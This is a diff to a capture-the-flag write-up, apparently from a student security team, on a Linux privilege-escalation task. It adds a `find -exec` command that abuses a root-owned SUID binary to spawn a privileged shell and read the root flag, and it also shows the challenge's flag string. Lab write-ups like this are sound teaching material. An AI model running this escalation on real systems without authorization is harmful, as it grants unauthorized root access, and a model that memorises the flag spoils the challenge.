@@ -140,10 +140,14 @@ We can start off with a few common privilege escalation techniques
 ```shell
 $ find / -type f -perm -u=s
 ```
-We have found that the `find` binary has SUID bit set
+We have found that the `find` binary has SUID bit set. It also happens to be owned by the **root** user:
+<img width="469" height="43" alt="image" src="https://github.com/user-attachments/assets/ed4f162d-8423-4264-989f-31c432ab962d" />
 
 - Execute custom command to activate an rbash session:
 
+```shell
+find . -exec rbash -p\; -quit
+```
 <img width="431" height="40" alt="image" src="https://github.com/user-attachments/assets/7f46584d-f210-4a93-944e-b4602318f451" />
 
 - Read content of `/root/flag.txt`:
@@ -153,7 +157,7 @@ Flag for task 3: `NTU_Sentinels{priv3sc_t0_ro0t}`
 
 ## Note on task 3
 
-There exists a useful site that provides a list of techniques for privilege escalation (https://gtfobins.org/gtfobins). This is also presented in the hint: "Search "site:gtfobins.org find SUID ...".
+There exists a useful site that provides a list of techniques for privilege escalation (https://gtfobins.org). The search term is also given in the hint: "Search "site:gtfobins.org find SUID ...".
 
 > https://gtfobins.org/gtfobins/find/
 <img width="830" height="88" alt="image" src="https://github.com/user-attachments/assets/ec39db4c-30ea-4532-b779-30c1e4fde411" />
